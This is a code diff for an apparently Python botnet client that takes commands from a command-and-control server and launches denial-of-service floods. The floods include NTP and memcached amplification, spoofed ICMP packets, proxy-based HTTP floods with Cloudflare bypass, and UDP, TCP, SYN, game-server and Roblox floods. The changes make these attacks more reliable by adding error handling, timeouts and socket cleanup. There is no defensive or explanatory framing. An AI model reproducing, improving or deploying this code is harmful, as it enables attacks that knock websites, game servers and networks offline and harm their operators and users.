@@ -23,15 +23,20 @@ base_user_agents = [
 ]
 
 def rand_ua():
-    chosen_user_agent = random.choice(base_user_agents)
-    return chosen_user_agent.format(
-        random.random() + 5,
-        random.random() + random.randint(1, 8),
-        random.random(),
-        random.randint(2000, 2100),
-        random.randint(92215, 99999),
-        random.random() + random.randint(3, 9)
-    )
+    try:
+        chosen_user_agent = random.choice(base_user_agents)
+        if chosen_user_agent == 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36':
+            return chosen_user_agent
+        return chosen_user_agent.format(
+            random.random() + 5,
+            random.random() + random.randint(1, 8),
+            random.random(),
+            random.randint(2000, 2100),
+            random.randint(92215, 99999),
+            random.random() + random.randint(3, 9)
+        )
+    except:
+        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
 
 
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
@@ -41,9 +46,11 @@ def NTP(target, port, timer):
             ntp_servers = f.readlines()
         packets = random.randint(10, 150)
     except Exception as e:
-        print(f"Erro: {e}")
-        pass
+        return
 
+    if not ntp_servers:
+        return
+    
     server = random.choice(ntp_servers).strip()
     while time.time() < timer:
         try:
@@ -70,8 +77,11 @@ def MEM(target, port, timer):
         with open("memsv.txt", "r") as f:
             memsv = f.readlines()
     except:
-        #print('Erro')
-        pass
+        return
+    
+    if not memsv:
+        return
+    
     server = random.choice(memsv).strip()
     while time.time() < timer:
         try:
@@ -91,10 +101,10 @@ def MEM(target, port, timer):
 def icmp(target, timer):
     while time.time() < timer:
         try:
-            for _ in range(5000000):
-                packet = random._urandom(int(random.randint(1024, 60000)))
-                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
-                #print('MEMCACHED SEND')
+            try:
+                pig(target, count=1, interval=0.1, timeout=1)
+            except:
+                pass
         except:
             pass
 
@@ -104,7 +114,7 @@ def pod(target, timer):
             rand_addr = spoofer()
             ip_hdr = IP(src=rand_addr, dst=target)
             packet = ip_hdr / ICMP() / ("m" * 60000)
-            send(packet)
+            send(packet, verbose=False)
         except:
             pass
 
@@ -122,8 +132,14 @@ def spoofer():
 
 def httpSpoofAttack(url, timer):
     timeout = time.time() + int(timer)
-    proxies = open("socks4.txt").readlines()
-    proxy = random.choice(proxies).strip().split(":")
+    try:
+        with open("socks4.txt", "r") as f:
+            proxies = f.readlines()
+        if not proxies:
+            return
+        proxy = random.choice(proxies).strip().split(":")
+    except:
+        return
     req =  "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -178,17 +194,19 @@ def run(target, proxies, cfbp):
     elif cfbp == 1 and len(proxies) > 0:
         headers = {'User-Agent': rand_ua()}
         scraper = cloudscraper.create_scraper()
-        scraper = cloudscraper.CloudScraper()
         
         proxy = random.choice(proxies)
-        proxies = {'http': 'http://' + proxy}
+        proxy_dict = {'http': 'http://' + proxy}
 
         try:
-            a = scraper.get(target, headers=headers, proxies=proxies, timeout=15)
+            a = scraper.get(target, headers=headers, proxies=proxy_dict, timeout=15)
 
             if a.status_code >= 200 and a.status_code <= 226:
                 for _ in range(100):
-                    scraper.get(target, headers=headers, proxies=proxies, timeout=15)
+                    try:
+                        scraper.get(target, headers=headers, proxies=proxy_dict, timeout=15)
+                    except:
+                        break
             else:
                 proxies = remove_by_value(proxies, proxy)
         
@@ -198,7 +216,6 @@ def run(target, proxies, cfbp):
     else:
         headers = {'User-Agent': rand_ua()}
         scraper = cloudscraper.create_scraper()
-        scraper = cloudscraper.CloudScraper()
 
         try:
             a = scraper.get(target, headers=headers, timeout=15)
@@ -249,133 +266,172 @@ def httpio(target, times, threads, attack_type):
 def CFB(url, port, secs):
     url = url + ":" + port
     while time.time() < secs:
-
-        random_list = random.choice(("FakeUser", "User"))
-        headers = ""
-        if "FakeUser" in random_list:
+        try:
             headers = {'User-Agent': rand_ua()}
-        else:
-            headers = {'User-Agent': rand_ua()}
-        scraper = cloudscraper.create_scraper()
-        scraper = cloudscraper.CloudScraper()
-        for _ in range(1500):
-            scraper.get(url, headers=headers, timeout=15)
-            scraper.head(url, headers=headers, timeout=15)
+            scraper = cloudscraper.create_scraper()
+            for _ in range(1500):
+                try:
+                    scraper.get(url, headers=headers, timeout=15)
+                    scraper.head(url, headers=headers, timeout=15)
+                except:
+                    pass
+        except:
+            pass
 
 def STORM_attack(ip, port, secs):
     ip = ip + ":" + port
     scraper = cloudscraper.create_scraper()
-    scraper = cloudscraper.CloudScraper()
-    s = requests.Session()
     while time.time() < secs:
-
-        random_list = random.choice(("FakeUser", "User"))
-        headers = ""
-        if "FakeUser" in random_list:
+        try:
             headers = {'User-Agent': rand_ua()}
-        else:
-            headers = {'User-Agent': rand_ua()}
-        for _ in range(1500):
-            requests.get(ip, headers=headers)
-            requests.head(ip, headers=headers)
-            scraper.get(ip, headers=headers)
+            for _ in range(1500):
+                try:
+                    requests.get(ip, headers=headers, timeout=10)
+                    requests.head(ip, headers=headers, timeout=10)
+                    scraper.get(ip, headers=headers, timeout=10)
+                except:
+                    pass
+        except:
+            pass
 
 def GET_attack(ip, port, secs):
     ip = ip + ":" + port
     scraper = cloudscraper.create_scraper()
-    scraper = cloudscraper.CloudScraper()
-    s = requests.Session()
     while time.time() < secs:
-        headers = {'User-Agent': rand_ua()}
-        for _ in range(1500):
-            requests.get(ip, headers=headers)
-            scraper.get(ip, headers=headers)
+        try:
+            headers = {'User-Agent': rand_ua()}
+            for _ in range(1500):
+                try:
+                    requests.get(ip, headers=headers, timeout=10)
+                    scraper.get(ip, headers=headers, timeout=10)
+                except:
+                    pass
+        except:
+            pass
 
 def attack_udp(ip, port, secs, size):
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        dport = random.randint(1, 65535) if port == 0 else port
-        data = random._urandom(size)
-        s.sendto(data, (ip, dport))
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            dport = random.randint(1, 65535) if port == 0 else port
+            data = random._urandom(size)
+            s.sendto(data, (ip, dport))
+            s.close()
+        except:
+            pass
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
+            s.settimeout(5)
             s.connect((ip, port))
             while time.time() < secs:
                 s.send(random._urandom(size))
+            s.close()
         except:
-            pass
+            try:
+                s.close()
+            except:
+                pass
 
 def attack_SYN(ip, port, secs):
-    
     while time.time() < secs:
-        
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         flags = 0b01000000
         
         try:
+            s.settimeout(5)
             s.connect((ip, port))
             pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
             
             while time.time() < secs:
                 s.send(pkt)
-        except:
             s.close()
+        except:
+            try:
+                s.close()
+            except:
+                pass
 
 def attack_tup(ip, port, secs, size):
     while time.time() < secs:
-        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        dport = random.randint(1, 65535) if port == 0 else port
+        udp = None
+        tcp = None
         try:
+            udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tcp.settimeout(5)
+            dport = random.randint(1, 65535) if port == 0 else port
             data = random._urandom(size)
             tcp.connect((ip, port))
             udp.sendto(data, (ip, dport))
             tcp.send(data)
-            print('Pacote TUP Enviado')
         except:
             pass
+        finally:
+            try:
+                if udp:
+                    udp.close()
+                if tcp:
+                    tcp.close()
+            except:
+                pass
 
 def attack_hex(ip, port, secs):
     payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(payload, (ip, port))
+            s.sendto(payload, (ip, port))
+            s.sendto(payload, (ip, port))
+            s.sendto(payload, (ip, port))
+            s.sendto(payload, (ip, port))
+            s.sendto(payload, (ip, port))
+            s.close()
+        except:
+            pass
 
 def attack_vse(ip, port, secs):
     payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                 b'\x20\x51\x75\x65\x72\x79\x00') # Read more here > https://developer.valvesoftware.com/wiki/Server_queries    
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(payload, (ip, port))
+            s.sendto(payload, (ip, port))
+            s.close()
+        except:
+            pass
 
 
 def attack_roblox(ip, port, secs, size):
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(size)
-        dport = random.randint(1, 65535) if port == 0 else port
-        for _ in range(1500):
-            ran = random.randrange(10 ** 80)
-            hex = "%064x" % ran
-            hex = hex[:64]
-            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            bytes_data = random._urandom(size)
+            dport = random.randint(1, 65535) if port == 0 else port
+            for _ in range(1500):
+                ran = random.randrange(10 ** 80)
+                hex_str = "%064x" % ran
+                hex_str = hex_str[:64]
+                s.sendto(bytes.fromhex(hex_str) + bytes_data, (ip, dport))
+            s.close()
+        except:
+            pass
 
 def attack_junk(ip, port, secs):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(payload, (ip, port))
+            s.sendto(payload, (ip, port))
+            s.sendto(payload, (ip, port))
+            s.close()
+        except:
+            pass
 
 def main():
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -403,10 +459,12 @@ def main():
                 time.sleep(5)
         while 1:
             try:
-                data = c2.recv(1024).decode().strip()
+                data = c2.recv(1024).decode('utf-8', errors='ignore').strip()
                 if not data:
                     break
                 args = data.split(' ')
+                if len(args) < 1:
+                    continue
                 command = args[0].upper()
 
                 if command == '.UDP':
